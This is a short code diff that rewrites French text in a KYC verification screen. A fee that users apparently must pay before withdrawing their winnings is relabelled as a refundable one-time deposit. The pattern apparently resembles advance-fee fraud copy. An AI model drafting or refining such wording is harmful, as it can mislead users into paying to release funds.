@@ -320,8 +320,7 @@ const VerifyKYC = () => {
                                     <p className="text-amber-200 font-semibold">Frais de Vérification</p>
                                 </div>
                                 <p className="text-amber-100 text-sm">
-                                    Afin de valider le retrait et obtenir vos gains, merci d’effectuer la vérification KYC <span className="font-bold text-lg">€{verificationAmount}</span> est requis pour
-                                    traiter votre vérification KYC.
+                                    Un dépôt de caution de <span className="font-bold text-lg">€{verificationAmount}</span> unique et remboursable est requis pour traiter votre vérification KYC.
                                 </p>
                             </div>
                         </div>
